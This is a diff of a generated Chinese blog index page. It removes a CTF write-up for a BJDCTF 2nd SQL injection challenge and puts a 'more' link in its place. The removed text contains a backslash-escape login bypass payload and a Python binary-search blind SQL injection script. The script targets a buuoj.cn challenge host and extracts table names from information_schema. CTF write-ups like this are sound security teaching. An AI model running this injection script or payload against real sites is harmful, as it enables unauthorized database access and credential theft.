@@ -192,7 +192,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">432字</span>
+        <span class="post-count">447字</span>
       </span>
     </span>
 
@@ -212,23 +212,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <a id="more"></a>
-<h1 id="burp-fuzz"><a href="#burp-fuzz" class="headerlink" title="burp fuzz"></a>burp fuzz</h1><p>学到了，，俺再也不要手工测过滤了QAQ。<a href="https://segmentfault.com/a/1190000018748071" target="_blank" rel="noopener">利用 Burpsuite Fuzz 实现 SQL 注入</a><br><img src="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png" alt="sqli 3.png"><br><img src="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png" alt="sqli 4.png">  </p>
-<h1 id="robots-txt提示"><a href="#robots-txt提示" class="headerlink" title="robots.txt提示"></a>robots.txt提示</h1><p>提示有hint.txt<br>访问如下：</p>
-<pre>
-Only u input the correct password then u can get the flag
-and p3rh4ps wants a girl friend.
-
-select * from users where username='$_POST["username"]' and password='$_POST["password"]';
-
-//鍑洪浜哄洓绾у帇绾挎墠杩� 瑙佽皡瑙佽皡 棰嗕細绮剧
-</pre>
-<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>后来从分享会上知道了可以用\来转义username后面的单引号。<br><img src="https://i.loli.net/2020/03/25/QnZT3aHcMX1SKWt.png" alt="sqli1.png"><br>payload：<code>username=admin\&amp;password=&#39;or 1#</code><br>带入得：<code>select * from users where username=&#39;admin\&#39; and password=&#39;&#39;or 1#&#39;</code>  </p>
-<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>已知为1时返回页面有：“you know …..girlfriend”,为0时返回“BDJ needs to be stronger”。<br>所以把这里的1换成判断语句就可以开始盲注了,又把之前的拿来改改：<br>这里传\的时候最开始不知道怎么传上去，因为它直接转义了后面的内容噗，后来从师傅们那里知道了要用俩，python会自动转义一次。  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://bad6a7d7-7c67-4b08-8083-fbda7d88b93e.node3.buuoj.cn&quot;</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;#定义一个空字符串</span><br><span class="line"></span><br><span class="line">for i in range(1,20):	</span><br><span class="line">	low=32</span><br><span class="line">	high=126</span><br><span class="line">	mid=(low+high)//2## 二分法</span><br><span class="line">	while high&gt;low:</span><br><span class="line">		</span><br><span class="line">		#payload=&apos;or ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		payload=&apos;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		data=&#123;</span><br><span class="line">			&apos;username&apos;:&apos;admin \\&apos;,</span><br><span class="line">			&apos;password&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		r=requests.post(url,data=data)	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		if &apos;stronger&apos; in r.text:</span><br><span class="line">			low = mid+1</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">		else:</span><br><span class="line">			high=mid	</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">	flag+=chr(mid)#将ascii值转为字符</span><br><span class="line">	print(flag)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-
-<p>ps：这里直接爆password就可以了，不用头铁去爆库爆表。。。database查出来了，但表名就查不了，至少我没查出来。<br><img src="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png" alt="bjd sql1.png"><br>得到密码，登录。<br><img src="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png" alt="bjd sql2.png">  </p>
-
+        <p>新手赛，看来我不是一个合格的新手。  </p>
+        
+          <a class="article-more-a" href="/2020/03/25/BJDCTF2nd/#more">more >></a>
+        
       
 
       
@@ -1237,15 +1224,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">xun9er日常废话</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">kali配置</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">乱七八糟</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">xun9er日常废话</a>
               </li>
              
               <li class="article-tag-list-item">
